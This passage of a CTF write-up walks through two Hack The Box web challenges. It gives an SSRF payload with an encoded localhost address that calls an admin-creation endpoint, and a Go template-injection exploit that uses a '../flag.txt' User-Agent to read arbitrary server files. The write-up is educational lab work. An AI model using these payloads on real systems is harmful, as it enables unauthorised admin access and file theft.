        <span>Exploiting the Vulnerability</span>
    </h3>
</doc-anchor-target>
<p>By analyzing our request with the docker container we can more easily see if our requests fail or not. Let&#x27;s firs try to use the following request parameters:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">{
    &quot;name&quot;:&quot;Test&quot;,
    &quot;price&quot;:&quot;10&quot;,
    &quot;description&quot;:&quot;test&quot;,
    &quot;manual&quot;:&quot;http://%31%32%37%2e%30%2e%30%2e%31:1337/addAdmin?username=bleed&quot;
}</code></pre>
</doc-codeblock></div>
<p>We see that we are able to make a successful submission but in the responses we see that we get a file not found error:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">127.0.0.1 - - [26/Oct/2023 16:36:50] &quot;GET /addAdmin HTTP/1.1&quot; 404 -</code></pre>
</doc-codeblock></div>
<p>This means the requested endpoint is not found. We have to target the <code v-pre>/api/addAdmin</code> endpoint and try again. After updating the parameter, we can successfully add us as an admin user with the following request:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">POST /api/product HTTP/1.1
Host: 127.0.0.1:1337
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://127.0.0.1:1337
Referer: http://127.0.0.1:1337/product
Cookie: session=.eJwdyt0KgjAYgOF72XmC9gN2FsvyW7KF2rSdRC6pNbcFCuGie086fZ_3gwanW4vWqB3Jo9lLxRSBk4eQKujB5kuJYQX6VXNM4mCaQhnxsTG7QRQTGNKLimtQbyVN3P-b5V7UoDJMujbdKPZMIlbePS3Pc-ppHDCWj55HiejAsMPRDVUGpdvOWI5vKbnaRaHtpU89iRz6_gAnPTYp.ZTqJxQ.DotQHfwlzUW4VNS4NVYxcW7Xdbk
Connection: close

{&quot;name&quot;:&quot;Test&quot;,&quot;price&quot;:&quot;10&quot;,&quot;description&quot;:&quot;test&quot;,&quot;manual&quot;:&quot;http://%31%32%37%2e%30%2e%30%2e%31:1337/api%2faddAdmin?username=bleed&quot;}</code></pre>
</doc-codeblock></div>
<p>After logging out and logging back in, we are given the flag on the home page.</p>
<doc-anchor-target id="web---ghostly-templates">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#web---ghostly-templates">#</doc-anchor-trigger>
        <span>Web - Ghostly Templates</span>
    </h2>
</doc-anchor-target>
<p>This challenge really reminded me of an earlier challenge that I solved on the HTB platform, namely <code v-pre>RenderQuest</code>. This challenge follows a similar approach with some few alteration.</p>
<doc-anchor-target id="browsing-the-website-1">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#browsing-the-website-1">#</doc-anchor-trigger>
        <span>Browsing the Website</span>
    </h3>
</doc-anchor-target>
<p>Taking a look at the functionality of the website, it allows us to use their golang templates on our own webpages. Gus Ralph has made an excellent <a href="https://www.onsecurity.io/blog/go-ssti-method-research/">blog post</a> about SSTIs in Go&#x27;s builtin html/template module. This discusses the vulnerabilities that can arise when using said templates.</p>
<p>The essence of the vulnerability lies in the fact that we can call any method through template injection from the source code, as long as the method is an attribute of the value passed to the template. Lets give the source code as an example here:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-go"><code v-pre class="language-go">type RequestData struct {
	ClientIP     string
	ClientUA     string
	ServerInfo   MachineInfo
	ClientIpInfo LocationInfo `json:&quot;location&quot;`
}

...

func GetServerInfo(command string) string {
	out, err := exec.Command(&quot;sh&quot;, &quot;-c&quot;, command).Output()
	if err != nil {
		return &quot;&quot;
	}
	return string(out)
}

...

func (p RequestData) OutFileContents(filePath string) string {
	data, err := os.ReadFile(filePath)
	if err != nil {
		return err.Error()
	}
	return string(data)
}

...</code></pre>
</doc-codeblock></div>
<p>The first function cannot be injected as it is not passed an attribute of the template that we can use. The second function however is vulnerable. I specifically chose this function as it reads a file from the server and returns its content. This means that we can read any file we want on the server.</p>
<doc-anchor-target id="exploiting-the-vulnerability-1">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#exploiting-the-vulnerability-1">#</doc-anchor-trigger>
        <span>Exploiting the Vulnerability</span>
    </h3>
</doc-anchor-target>
<p>Now to exploit the vulnerability, we of course need to host a website that implements the given templates. Luckily, Go provides its own <a href="https://go.dev/play/">playground</a> for testing code that we can use. Lets make a simple website that uses one of their templates and see the responses.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-markup"><code v-pre class="language-markup">&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;title&gt;Test Page&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;p&gt;{{ . }}&lt;/p&gt;
    &lt;/body&gt;
&lt;/html&gt;</code></pre>
</doc-codeblock></div>
<p>This page simply renders all the templates we have available to us, but we can equally call a simple template like <code v-pre>.ServerInfo.Hostname</code>.
As discussed previously, our job is to read a file from the server (flag.txt). Lets adapt our page:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;title&gt;Test Page&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;p&gt;{{.OutFileContents .ClientUA}}&lt;/p&gt;
    &lt;/body&gt;
&lt;/html&gt;</code></pre>
</doc-codeblock></div>
<p>This page will call the <code v-pre>OutFileContents()</code> function from the <code v-pre>main.go</code> file and pass in our UserAgent as a parameter. Now why not just pass in the file we want to read? Well, since the function expects an argument of type <code v-pre>RequestData</code>, so we might not be always able to pass it a string. We will have to modify our UserAgent when sending our request. We can either do this with BurpSuite, but a simple curl can also do the trick:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">curl  -H &quot;User-Agent: ../flag.txt&quot; 'http://&lt;IP&gt;:&lt;PORT&gt;/render?use_remote=true&amp;page=https://go.dev/play/p/&lt;ID_TO_OUR_TEST_PAGE&gt;.go?download=true'</code></pre>
</doc-codeblock></div>
<p>We have found the flag.</p>
<doc-anchor-target id="conclusion">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#conclusion">#</doc-anchor-trigger>
        <span>Conclusion</span>
    </h2>
</doc-anchor-target>
<p>These small challenges, although rated as easy by the developers, did caught me off guard sometimes. Overall I learned quite some new things and had great fun in solving the challenges. Big shout out to Hack The Box for organizing this event!</p>

                                
                                <!-- Required only on API pages -->
                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
                            </div>
                            <footer id="retype-content-footer" class="clear-both">
                            
                                <nav id="retype-nextprev" class="print:hidden flex mt-14">
                                    <div class="w-1/2">
                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../writeups/ctf/cscbe-bad-ransomware/">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                            <span>
                                                <span class="block text-xs font-normal text-base-text-muted">Previous</span>
                                                <span class="block mt-1">CSCBE​24 - Bad Ransomware</span>
                                            </span>
                                        </a>
                                    </div>
                            
                                    <div class="w-1/2">
                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../writeups/ctf/htb-university-ctf-23/">
                                            <span>
                                                <span class="block text-xs font-normal text-right text-base-text-muted">Next</span>
                                                <span class="block mt-1">HTB University CTF 2023: Brains & Bytes</span>
                                            </span>
                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                        </a>
                                    </div>
                                </nav>
                            </footer>
                        </main>
                
                        <div id="retype-page-footer" class="print:border-none border-t border-base-border pt-6 mb-8">
                            <footer class="flex flex-wrap items-center justify-between print:justify-center">
                                <div id="retype-footer-links" class="print:hidden">
                                    <ul class="flex flex-wrap items-center text-sm">
                                    </ul>
                                </div>
                                <div id="retype-copyright" class="print:justify-center py-2 text-footer-text font-footer-link-weight text-sm leading-relaxed"><p>© Copyright 2025. All rights reserved.</p></div>
                            </footer>
                        </div>
                    </div>
                
                    <!-- Rendered if sidebar right is enabled -->
                    <!-- Sidebar right skeleton-->
                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-sidebar-right-bg border-sidebar-right-border lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton">
                        <div class="pl-5">
                            <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                            <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                            <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                        </div>
                    </div>
                
                    <!-- User should be able to hide sidebar right -->
                    <doc-sidebar-right v-cloak></doc-sidebar-right>
                </div>

            </div>
        </div>
    
        <doc-search-mobile></doc-search-mobile>
        <doc-back-to-top></doc-back-to-top>
    </div>


    <div id="retype-overlay-target"></div>

    <script data-cfasync="false">window.__DOCS__ = { "title": "Hack The Boo 2023 - Forensics and Web", level: 3, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
</body>
</html>
